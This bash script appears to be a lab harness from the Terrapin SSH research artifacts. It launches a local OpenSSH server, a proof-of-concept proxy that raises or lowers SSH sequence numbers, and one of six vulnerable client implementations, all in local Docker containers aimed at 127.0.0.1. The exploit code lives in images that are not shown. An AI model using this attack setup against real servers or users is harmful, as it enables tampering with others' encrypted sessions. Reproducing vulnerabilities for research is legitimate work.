#!/bin/bash

SERVER_IMPL_NAME="OpenSSH 9.5p1"
SERVER_IMAGE="terrapin-artifacts/openssh-server:9.5p1"
SERVER_CONTAINER_NAME="terrapin-artifacts-server"
SERVER_PORT=2222

POC_CONTAINER_NAME="terrapin-artifacts-poc"

CLIENT_CONTAINER_NAME="terrapin-artifacts-client"

function ensure_images {
  bash $(dirname "$0")/../impl/build.sh
  bash $(dirname "$0")/../pocs/build.sh
}

function print_info {
  echo "TODO"
}

function start_ssh_server {
  echo "[+] Starting $SERVER_IMPL_NAME server on port $SERVER_PORT"
  docker run -d \
    --rm \
    --network host \
    --name $SERVER_CONTAINER_NAME \
    $SERVER_IMAGE -p $SERVER_PORT > /dev/null 2>&1
}

function select_and_run_poc_proxy {
  echo "[+] This script supports the following sequence number manipulations as PoC:"
  echo -e "\t1) RcvIncrease"
  echo -e "\t2) RcvDecrease"
  echo -e "\t3) SndIncrease"
  echo -e "\t4) SndDecrease"
  read -p "[+] Please input PoC variant to test [1-4]: " POC_VARIANT

  case $POC_VARIANT in
    1)
      POC_VARIANT_NAME="RcvIncrease"
      POC_IMAGE="terrapin-artifacts/sqn-rcv-increase" ;;
    2)
      POC_VARIANT_NAME="RcvDecrease"
      POC_IMAGE="terrapin-artifacts/sqn-rcv-decrease" ;;
    3)
      POC_VARIANT_NAME="SndIncrease"
      POC_IMAGE="terrapin-artifacts/sqn-snd-increase" ;;
    4)
      POC_VARIANT_NAME="SndDecrease"
      POC_IMAGE="terrapin-artifacts/sqn-snd-decrease" ;;
    *)
      echo "[!] Invalid selection, please re-run the script"
      exit 1 ;;
  esac
  echo "[+] Selected PoC variant: '$POC_VARIANT_NAME'"

  read -p "[+] Please input a natural number N between 0 and 2^32 to increase or decrease the sequence number by: " DECREASE_INCREASE_BY

  docker run \
    --rm \
    --network host \
    --name $POC_CONTAINER_NAME \
    $POC_IMAGE --server-ip "127.0.0.1" --server-port 2222 -N $DECREASE_INCREASE_BY &
  sleep 5
}

function select_and_run_client {
  echo "[+] This script supports the following SSH client implementations:"
  echo -e "\t1) AsyncSSH 2.13.2"
  echo -e "\t2) Dropbear 2022.83"
  echo -e "\t3) libssh 0.10.5"
  echo -e "\t4) OpenSSH 9.4p1"
  echo -e "\t5) OpenSSH 9.5p1"
  echo -e "\t6) PuTTY 0.79"
  read -p "[+] Please input client implementation to test [1-6]: " CLIENT_IMPL

  case $CLIENT_IMPL in
    1)
      CLIENT_IMPL_NAME="AsyncSSH 2.13.2"
      CLIENT_IMAGE="terrapin-artifacts/asyncssh-client:2.13.2" ;;
    2)
      CLIENT_IMPL_NAME="Dropbear 2022.83"
      CLIENT_IMAGE="terrapin-artifacts/dropbear-client:2022.83" ;;
    3)
      CLIENT_IMPL_NAME="libssh 0.10.5"
      CLIENT_IMAGE="terrapin-artifacts/libssh-client:0.10.5" ;;
    4)
      CLIENT_IMPL_NAME="OpenSSH 9.4p1"
      CLIENT_IMAGE="terrapin-artifacts/openssh-client:9.4p1" ;;
    5)
      CLIENT_IMPL_NAME="OpenSSH 9.5p1"
      CLIENT_IMAGE="terrapin-artifacts/openssh-client:9.5p1" ;;
    6)
      CLIENT_IMPL_NAME="PuTTY 0.79"
      CLIENT_IMAGE="terrapin-artifacts/putty-client:0.79" ;;
    *)
      echo "[!] Invalid selection, please re-run the script"
      exit 1 ;;
  esac
  echo "[+] Selected client implementation: '$CLIENT_IMPL_NAME'"

  if [ ! $CLIENT_IMPL -eq 1 ]; then
    EXTRA_ARGS="victim@127.0.0.1"
  else
    EXTRA_ARGS=""
  fi

  docker run \
    --rm \
    --network host \
    --name $CLIENT_CONTAINER_NAME \
    $CLIENT_IMAGE $EXTRA_ARGS
  echo "[+] Client terminated, PoC done"
}

function cleanup {
  echo "[+] Stopping any remaining artifact containers"
  docker stop \
    $SERVER_CONTAINER_NAME \
    $POC_CONTAINER_NAME \
    $CLIENT_CONTAINER_NAME > /dev/null 2>&1
}

ensure_images
print_info
start_ssh_server
select_and_run_poc_proxy
select_and_run_client
cleanup
